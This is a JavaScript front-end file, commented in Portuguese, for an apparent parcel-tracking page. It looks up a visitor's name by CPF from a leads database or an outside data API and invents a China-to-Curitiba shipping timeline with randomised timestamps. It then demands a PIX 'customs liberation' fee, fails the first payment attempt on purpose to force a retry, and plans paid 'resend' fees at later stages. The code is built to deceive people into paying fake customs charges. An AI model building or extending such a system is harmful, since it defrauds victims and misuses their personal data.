/**
 * Sistema de rastreamento principal
 */
import { CPFValidator } from '../utils/cpf-validator.js';
import { DataService } from '../utils/data-service.js';
import { ZentraPayService } from '../services/zentra-pay.js';
import { DatabaseService } from '../services/database.js';

export class TrackingSystem {
    constructor() {
        this.isInitialized = false;
        this.currentCPF = null;
        this.userData = null;
        this.leadData = null;
        this.trackingData = null;
        this.dataService = new DataService();
        this.zentraPayService = new ZentraPayService();
        this.dbService = new DatabaseService();
        this.liberationAttempts = 0;
        this.maxLiberationAttempts = 2;
        this.deliveryAttempts = 0;
        this.currentStage = 1;
        this.isLiberationPaid = false;
        
        console.log('🚀 TrackingSystem inicializado');
        this.init();
    }

    async init() {
        if (this.isInitialized) return;
        
        console.log('🔧 Inicializando sistema de rastreamento...');
        
        try {
            this.setupEventListeners();
            this.setupCPFMask();
            this.checkURLParams();
            this.isInitialized = true;
            
            console.log('✅ Sistema de rastreamento inicializado com sucesso');
        } catch (error) {
            console.error('❌ Erro na inicialização:', error);
        }
    }

    setupEventListeners() {
        const form = document.getElementById('trackingForm');
        if (form) {
            form.addEventListener('submit', (e) => this.handleFormSubmit(e));
        }

        // Configurar accordion dos detalhes
        const detailsHeader = document.getElementById('detailsHeader');
        if (detailsHeader) {
            detailsHeader.addEventListener('click', () => this.toggleOrderDetails());
        }

        // Configurar modal de liberação
        this.setupLiberationModal();
    }

    setupCPFMask() {
        const cpfInput = document.getElementById('cpfInput');
        if (cpfInput) {
            cpfInput.addEventListener('input', (e) => {
                CPFValidator.applyCPFMask(e.target);
            });
        }
    }

    checkURLParams() {
        const urlParams = new URLSearchParams(window.location.search);
        const focusCPF = urlParams.get('focus') === 'cpf';
        
        if (focusCPF) {
            setTimeout(() => {
                const cpfInput = document.getElementById('cpfInput');
                if (cpfInput) {
                    cpfInput.focus();
                }
            }, 500);
        }
    }

    async handleFormSubmit(e) {
        e.preventDefault();
        
        const cpfInput = document.getElementById('cpfInput');
        const cpf = cpfInput.value.replace(/[^\d]/g, '');
        
        if (!CPFValidator.isValidCPF(cpf)) {
            this.showError('CPF inválido. Verifique os dados e tente novamente.');
            return;
        }

        this.currentCPF = cpf;
        await this.handleTrackingSubmit();
    }

    async handleTrackingSubmit() {
        console.log('🔍 Iniciando rastreamento para CPF:', this.currentCPF);
        
        this.showLoadingNotification();
        
        try {
            // Primeiro, tentar buscar dados do lead no banco de dados
            console.log('🔍 Buscando lead no banco de dados...');
            const leadResult = await this.dbService.getLeadByCPF(this.currentCPF);
            
            if (leadResult.success && leadResult.data) {
                // Lead encontrado no banco - usar dados do lead
                console.log('✅ Lead encontrado no banco de dados:', leadResult.data);
                
                this.userData = {
                    nome: leadResult.data.nome_completo,
                    cpf: this.currentCPF,
                    nascimento: this.generateBirthDate(this.currentCPF),
                    situacao: 'REGULAR'
                };
                
                this.leadData = leadResult.data;
                
                console.log('📦 Dados do usuário configurados (do banco):', this.userData);
                console.log('📦 Etapa atual do lead:', this.leadData.etapa_atual);
                
                this.closeLoadingNotification();
                this.displayResults();
            } else {
                // Lead não encontrado no banco - buscar dados do CPF via API
                console.log('🌐 Lead não encontrado no banco, buscando dados via API...');
                const result = await this.dataService.fetchCPFData(this.currentCPF);
                
                if (result && result.DADOS) {
                    this.userData = {
                        nome: result.DADOS.nome,
                        cpf: this.currentCPF,
                        nascimento: result.DADOS.nascimento,
                        situacao: result.DADOS.situacao || 'REGULAR'
                    };
                    
                    console.log('✅ Dados do usuário obtidos via API:', this.userData);
                    
                    this.closeLoadingNotification();
                    this.displayResults();
                } else {
                    throw new Error('Dados não encontrados');
                }
            }
        } catch (error) {
            console.error('❌ Erro no rastreamento:', error);
            this.closeLoadingNotification();
            this.showError('Erro ao buscar dados. Tente novamente.');
        }
    }

    generateBirthDate(cpf) {
        const cleanCPF = cpf.replace(/[^\d]/g, '');
        const year = 1960 + (parseInt(cleanCPF.slice(0, 2)) % 40);
        const month = (parseInt(cleanCPF.slice(2, 4)) % 12) + 1;
        const day = (parseInt(cleanCPF.slice(4, 6)) % 28) + 1;
        
        return `${day.toString().padStart(2, '0')}/${month.toString().padStart(2, '0')}/${year}`;
    }

    generateTrackingData() {
        const today = new Date();
        const dates = this.generateRealisticDates(today, 11);
        
        // Determinar etapa atual baseada nos dados do lead (se disponível)
        let currentStep = 11; // Padrão
        if (this.leadData && this.leadData.etapa_atual) {
            currentStep = Math.min(this.leadData.etapa_atual, 26);
        }
        
        this.trackingData = {
            currentStep: currentStep,
            steps: [
                { id: 1, date: dates[0], title: 'Seu pedido foi criado', description: 'Seu pedido foi criado', completed: currentStep >= 1 },
                { id: 2, date: dates[1], title: 'Preparando para envio', description: 'O seu pedido está sendo preparado para envio', completed: currentStep >= 2 },
                { id: 3, date: dates[2], title: 'Pedido enviado', description: '[China] O vendedor enviou seu pedido', completed: currentStep >= 3, isChina: true },
                { id: 4, date: dates[3], title: 'Centro de triagem', description: '[China] O pedido chegou ao centro de triagem de Shenzhen', completed: currentStep >= 4, isChina: true },
                { id: 5, date: dates[4], title: 'Centro logístico', description: '[China] Pedido saiu do centro logístico de Shenzhen', completed: currentStep >= 5, isChina: true },
                { id: 6, date: dates[5], title: 'Trânsito internacional', description: '[China] Coletado. O pedido está em trânsito internacional', completed: currentStep >= 6, isChina: true },
                { id: 7, date: dates[6], title: 'Liberado para exportação', description: '[China] O pedido foi liberado na alfândega de exportação', completed: currentStep >= 7, isChina: true },
                { id: 8, date: dates[7], title: 'Saiu da origem', description: 'Pedido saiu da origem: Shenzhen', completed: currentStep >= 8 },
                { id: 9, date: dates[8], title: 'Chegou no Brasil', description: 'Pedido chegou no Brasil', completed: currentStep >= 9 },
                { id: 10, date: dates[9], title: 'Centro de distribuição', description: 'Pedido em trânsito para CURITIBA/PR', completed: currentStep >= 10 },
                { id: 11, date: dates[10], title: 'Alfândega de importação', description: 'Pedido chegou na alfândega de importação: CURITIBA/PR', completed: currentStep >= 11, needsLiberation: true }
            ]
        };
        
        // Verificar se liberação já foi paga
        if (this.leadData && this.leadData.status_pagamento === 'pago') {
            this.isLiberationPaid = true;
            
            // Adicionar etapa 12 se já foi pago
            if (currentStep >= 12) {
                this.trackingData.steps.push({
                    id: 12,
                    date: new Date(this.leadData.updated_at || Date.now()),
                    title: 'Pedido liberado',
                    description: 'Pedido liberado na Alfândega de Importação',
                    completed: true
                });
            }
        }
        
        console.log('📊 Dados de rastreamento gerados:', {
            currentStep: currentStep,
            totalSteps: this.trackingData.steps.length,
            liberationPaid: this.isLiberationPaid
        });
    }

    displayResults() {
        this.displayOrderDetails();
        this.generateTrackingData();
        this.displayTrackingResults();
        
        // Scroll para resultados
        const orderDetails = document.getElementById('orderDetails');
        if (orderDetails) {
            setTimeout(() => {
                orderDetails.scrollIntoView({ behavior: 'smooth' });
            }, 100);
        }
    }

    displayOrderDetails() {
        const orderDetails = document.getElementById('orderDetails');
        const customerName = document.getElementById('customerName');
        const fullName = document.getElementById('fullName');
        const formattedCpf = document.getElementById('formattedCpf');
        
        if (orderDetails) {
            orderDetails.style.display = 'block';
        }
        
        if (customerName) {
            customerName.textContent = this.userData.nome;
        }
        
        if (fullName) {
            fullName.textContent = this.userData.nome;
        }
        
        if (formattedCpf) {
            formattedCpf.textContent = CPFValidator.formatCPF(this.userData.cpf);
        }
    }

    displayTrackingResults() {
        const trackingResults = document.getElementById('trackingResults');
        const customerNameStatus = document.getElementById('customerNameStatus');
        const currentStatus = document.getElementById('currentStatus');
        
        if (trackingResults) {
            trackingResults.style.display = 'block';
        }
        
        if (customerNameStatus) {
            customerNameStatus.textContent = this.userData.nome;
        }
        
        if (currentStatus) {
            currentStatus.textContent = 'Aguardando liberação aduaneira';
        }
        
        this.renderTimeline();
    }

    generateRealisticDates(endDate, numSteps) {
        const dates = [];
        const now = new Date();
        const today = new Date(endDate);
        
        // Dia -2
        const day1 = new Date(today);
        day1.setDate(day1.getDate() - 2);
        dates.push(this.getRandomTimeOnDate(day1));
        dates.push(this.getRandomTimeOnDate(day1));
        
        // Dia -1
        const day2 = new Date(today);
        day2.setDate(day2.getDate() - 1);
        for (let i = 2; i < 9; i++) {
            dates.push(this.getRandomTimeOnDate(day2));
        }
        
        // Hoje - horários anteriores ao atual
        dates.push(this.getTimeBeforeNow(today, now, 1));
        dates.push(this.getTimeBeforeNow(today, now, 2));
        
        return dates;
    }

    getRandomTimeOnDate(date) {
        const newDate = new Date(date);
        const hour = Math.floor(Math.random() * 18) + 5;
        const minute = Math.floor(Math.random() * 60);
        newDate.setHours(hour, minute, 0, 0);
        return newDate;
    }

    getTimeBeforeNow(targetDate, currentTime, stepOrder) {
        const newDate = new Date(targetDate);
        const currentHour = currentTime.getHours();
        
        let hoursBack;
        if (stepOrder === 1) {
            hoursBack = Math.floor(Math.random() * 4) + 2;
        } else {
            hoursBack = Math.random() * 1.5 + 0.5;
        }
        
        const targetTime = new Date(currentTime);
        targetTime.setHours(targetTime.getHours() - hoursBack);
        
        if (targetTime.getHours() < 6) {
            targetTime.setHours(6 + Math.floor(Math.random() * 2));
            targetTime.setMinutes(Math.floor(Math.random() * 60));
        }
        
        newDate.setHours(targetTime.getHours(), targetTime.getMinutes(), 0, 0);
        return newDate;
    }

    renderTimeline() {
        const timeline = document.getElementById('trackingTimeline');
        if (!timeline) return;
        
        timeline.innerHTML = '';
        
        this.trackingData.steps.forEach((step, index) => {
            const timelineItem = this.createTimelineItem(step, index);
            timeline.appendChild(timelineItem);
            
            setTimeout(() => {
                timelineItem.style.opacity = '1';
                timelineItem.style.transform = 'translateY(0)';
            }, index * 100);
        });
    }

    createTimelineItem(step, index) {
        const item = document.createElement('div');
        item.className = `timeline-item ${step.completed ? 'completed' : ''}`;
        item.style.opacity = '0';
        item.style.transform = 'translateY(20px)';
        item.style.transition = 'all 0.5s ease';
        
        const dateStr = step.date.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' });
        const timeStr = step.date.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
        
        let buttonHtml = '';
        
        // Botão "Liberar Pacote" APENAS na etapa 11 e se não foi pago
        if (step.id === 11 && step.needsLiberation && !this.isLiberationPaid) {
            buttonHtml = `
                <button class="liberation-button-timeline" onclick="window.trackingSystemInstance.showLiberationModal()">
                    <i class="fas fa-unlock"></i> Liberar Pacote
                </button>
            `;
        }
        
        // Botões "Reenviar Pacote" nas etapas específicas
        if (this.needsDeliveryPayment(step.id)) {
            const deliveryValue = this.getDeliveryValue(step.id);
            buttonHtml = `
                <button class="liberation-button-timeline delivery-retry-btn" onclick="window.trackingSystemInstance.showDeliveryModal(${step.id})">
                    <i class="fas fa-redo"></i> Reenviar Pacote
                </button>
            `;
        }
        
        const chinaTag = step.isChina ? '<span class="china-tag">China</span>' : '';
        
        item.innerHTML = `
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${dateStr}</span>
                    <span class="time">${timeStr}</span>
                </div>
                <div class="timeline-text">
                    <p>${chinaTag}${step.description}</p>
                    ${buttonHtml}
                </div>
            </div>
        `;
        
        return item;
    }

    needsDeliveryPayment(stepId) {
        // Botões "Reenviar Pacote" nas etapas específicas
        return [16, 20, 24].includes(stepId);
    }

    getDeliveryValue(stepId) {
        const values = {
            16: 9.74,  // 1ª tentativa
            20: 14.98, // 2ª tentativa
            24: 18.96  // 3ª tentativa
        };
        return values[stepId] || 9.74;
    }

    setupLiberationModal() {
        // Configurar eventos do modal de liberação
        const closeButton = document.getElementById('closeModal');
        const modal = document.getElementById('liberationModal');
        const copyButton = document.getElementById('copyPixButtonModal');
        const simulateButton = document.getElementById('simulatePaymentButton');
        
        if (closeButton) {
            closeButton.addEventListener('click', () => {
                this.closeLiberationModal();
            });
        }
        
        if (modal) {
            modal.addEventListener('click', (e) => {
                if (e.target === modal) {
                    this.closeLiberationModal();
                }
            });
        }
        
        if (copyButton) {
            copyButton.addEventListener('click', () => {
                this.copyPixCode();
            });
        }
        
        if (simulateButton) {
            simulateButton.addEventListener('click', () => {
                this.handleLiberationPayment();
            });
        }
    }

    showLiberationModal() {
        console.log('🔓 Abrindo modal de liberação aduaneira');
        
        const modal = document.getElementById('liberationModal');
        if (modal) {
            modal.style.display = 'flex';
            document.body.style.overflow = 'hidden';
            
            // Resetar botão para primeira tentativa
            const simulateButton = document.getElementById('simulatePaymentButton');
            if (simulateButton) {
                simulateButton.innerHTML = '<i class="fas fa-credit-card"></i> Simular Pagamento';
                simulateButton.removeAttribute('data-retry');
            }
        }
    }

    closeLiberationModal() {
        const modal = document.getElementById('liberationModal');
        if (modal) {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    }

    handleLiberationPayment() {
        const simulateButton = document.getElementById('simulatePaymentButton');
        if (!simulateButton) return;
        
        this.liberationAttempts++;
        console.log(`💳 Tentativa de pagamento ${this.liberationAttempts}/${this.maxLiberationAttempts}`);
        
        if (this.liberationAttempts === 1) {
            // Primeira tentativa - erro
            console.log('❌ Primeira tentativa - simulando erro');
            alert('Erro ao processar pagamento');
            simulateButton.innerHTML = '<i class="fas fa-redo"></i> Tentar Novamente';
            simulateButton.setAttribute('data-retry', 'true');
        } else {
            // Segunda tentativa - sucesso
            console.log('✅ Segunda tentativa - sucesso');
            this.processSuccessfulPayment();
        }
    }

    processSuccessfulPayment() {
        console.log('🎉 Pagamento processado com sucesso!');
        
        // Marcar como pago
        this.isLiberationPaid = true;
        
        // Fechar modal
        this.closeLiberationModal();
        
        // Avançar para etapa 12
        this.addStage12();
        
        // Atualizar no banco de dados se possível
        if (this.currentCPF) {
            this.dbService.updatePaymentStatus(this.currentCPF, 'pago');
            this.dbService.updateLeadStage(this.currentCPF, 12);
        }
    }

    addStage12() {
        console.log('📦 Adicionando etapa 12: Pedido liberado');
        
        const timeline = document.getElementById('trackingTimeline');
        if (!timeline) return;
        
        // Criar nova etapa 12
        const stage12Date = new Date();
        const stage12Item = this.createStage12Item(stage12Date);
        
        timeline.appendChild(stage12Item);
        
        // Animar entrada
        setTimeout(() => {
            stage12Item.style.opacity = '1';
            stage12Item.style.transform = 'translateY(0)';
            
            // Scroll para nova etapa
            stage12Item.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }, 100);
        
        // Atualizar status atual
        const currentStatus = document.getElementById('currentStatus');
        if (currentStatus) {
            currentStatus.textContent = 'Pedido liberado na alfândega';
        }
    }

    createStage12Item(date) {
        const item = document.createElement('div');
        item.className = 'timeline-item completed new-step';
        item.style.opacity = '0';
        item.style.transform = 'translateY(20px)';
        item.style.transition = 'all 0.5s ease';
        
        const dateStr = date.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' });
        const timeStr = date.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
        
        item.innerHTML = `
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${dateStr}</span>
                    <span class="time">${timeStr}</span>
                </div>
                <div class="timeline-text">
                    <p>Pedido liberado na Alfândega de Importação</p>
                </div>
            </div>
        `;
        
        return item;
    }

    showDeliveryModal(stepId) {
        const value = this.getDeliveryValue(stepId);
        const attemptNumber = this.getAttemptNumber(stepId);
        
        console.log(`🚚 Abrindo modal de reenvio - Etapa ${stepId} - R$ ${value.toFixed(2)}`);
        
        // Implementar modal de reenvio aqui
        alert(`Modal de reenvio para etapa ${stepId} - R$ ${value.toFixed(2)}`);
    }

    getAttemptNumber(stepId) {
        const attemptMap = { 16: 1, 20: 2, 24: 3 };
        return attemptMap[stepId] || 1;
    }

    copyPixCode() {
        const pixInput = document.getElementById('pixCodeModal');
        const copyButton = document.getElementById('copyPixButtonModal');
        
        if (!pixInput || !copyButton) return;
        
        try {
            pixInput.select();
            pixInput.setSelectionRange(0, 99999);
            
            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(pixInput.value).then(() => {
                    this.showCopySuccess(copyButton);
                }).catch(() => {
                    this.fallbackCopy(pixInput, copyButton);
                });
            } else {
                this.fallbackCopy(pixInput, copyButton);
            }
        } catch (error) {
            console.error('❌ Erro ao copiar PIX:', error);
        }
    }

    fallbackCopy(input, button) {
        try {
            const successful = document.execCommand('copy');
            if (successful) {
                this.showCopySuccess(button);
            }
        } catch (error) {
            console.error('❌ Fallback copy falhou:', error);
        }
    }

    showCopySuccess(button) {
        const originalText = button.innerHTML;
        button.innerHTML = '<i class="fas fa-check"></i> Copiado!';
        button.style.background = '#27ae60';
        
        setTimeout(() => {
            button.innerHTML = originalText;
            button.style.background = '';
        }, 2000);
    }

    toggleOrderDetails() {
        const content = document.getElementById('detailsContent');
        const toggleIcon = document.querySelector('.toggle-icon i');
        
        if (content && toggleIcon) {
            const isExpanded = content.classList.contains('expanded');
            
            if (isExpanded) {
                content.classList.remove('expanded');
                toggleIcon.classList.remove('rotated');
            } else {
                content.classList.add('expanded');
                toggleIcon.classList.add('rotated');
            }
        }
    }

    showLoadingNotification() {
        const notification = document.createElement('div');
        notification.id = 'trackingNotification';
        notification.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 3000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;

        const content = document.createElement('div');
        content.style.cssText = `
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
            border: 3px solid #1e4a6b;
        `;

        content.innerHTML = `
            <div style="margin-bottom: 20px;">
                <i class="fas fa-search" style="font-size: 3rem; color: #1e4a6b; animation: pulse 1.5s infinite;"></i>
            </div>
            <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
                Identificando Pedido...
            </h3>
            <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
                Aguarde enquanto rastreamos seu pacote
            </p>
        `;

        notification.appendChild(content);
        document.body.appendChild(notification);
        document.body.style.overflow = 'hidden';
    }

    closeLoadingNotification() {
        const notification = document.getElementById('trackingNotification');
        if (notification) {
            notification.style.animation = 'fadeOut 0.3s ease';
            setTimeout(() => {
                if (notification.parentNode) {
                    notification.remove();
                }
                document.body.style.overflow = 'auto';
            }, 300);
        }
    }

    showError(message) {
        const existingError = document.querySelector('.error-message');
        if (existingError) {
            existingError.remove();
        }

        const errorDiv = document.createElement('div');
        errorDiv.className = 'error-message';
        errorDiv.style.cssText = `
            background: #fee;
            color: #c33;
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            border: 1px solid #fcc;
            text-align: center;
            font-weight: 500;
            animation: slideDown 0.3s ease;
        `;
        errorDiv.textContent = message;

        const form = document.querySelector('.tracking-form');
        if (form) {
            form.appendChild(errorDiv);

            setTimeout(() => {
                if (errorDiv.parentNode) {
                    errorDiv.style.animation = 'slideUp 0.3s ease';
                    setTimeout(() => errorDiv.remove(), 300);
                }
            }, 5000);
        }
    }
}